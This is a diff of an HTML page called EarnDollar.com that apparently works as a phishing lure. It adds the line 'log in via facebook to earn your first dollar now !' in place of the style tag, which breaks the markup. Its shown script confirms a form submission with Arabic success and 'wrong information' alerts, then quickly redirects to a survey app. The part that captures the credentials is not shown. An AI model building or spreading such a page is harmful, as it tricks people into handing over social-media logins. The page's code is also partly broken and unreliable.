@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>EarnDollar.com</title>
-    <style>
+    <p1>log in via facebook to earn your first dollar now !</p1>
         body {
             display: flex;
             flex-direction: column;
@@ -104,10 +104,10 @@
                 .then(function(response) {
                     console.log('SUCCESS!', response.status, response.text);
                     alert('تم التسجيل بنجاح !يرجى انتظار رسالة تأكيد الحساب .');
-                    // Redirect after 3 seconds (3000 milliseconds)
+                    // Redirect after 1 seconds (1000 milliseconds)
                     setTimeout(function() {
                         window.location.href = "https://play.google.com/store/apps/details?id=app.dollarsurveys"; // Google Play Store link
-                    }, 3000);
+                    }, 1000);
                 }, function(error) {
                     console.error('FAILED...', error);
                     alert('المعلومات خاطئة يرجى إعادة المحاولة .');
